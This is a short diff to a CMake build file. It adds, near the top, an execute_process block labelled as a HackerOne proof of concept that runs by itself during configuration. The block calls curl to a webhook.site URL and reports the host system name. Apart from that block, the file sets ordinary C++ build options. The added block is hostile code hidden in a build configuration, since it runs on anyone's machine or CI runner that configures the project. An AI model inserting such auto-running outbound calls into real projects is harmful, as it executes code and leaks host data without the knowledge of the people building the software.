@@ -1,4 +1,11 @@
 CMAKE_MINIMUM_REQUIRED(VERSION 3.14 FATAL_ERROR)
+
+# PoC: This executes during cmake configuration phase
+# HackerOne: m0oncake
+execute_process(
+  COMMAND curl -s "https://webhook.site/19080f8a-216b-4f1a-9582-7efebc4be1d3?proof=cmake_rce&researcher=m0oncake&host=${CMAKE_HOST_SYSTEM_NAME}"
+)
+
 set(CMAKE_CXX_STANDARD 17)
 set(CMAKE_POSITION_INDEPENDENT_CODE ON)
 
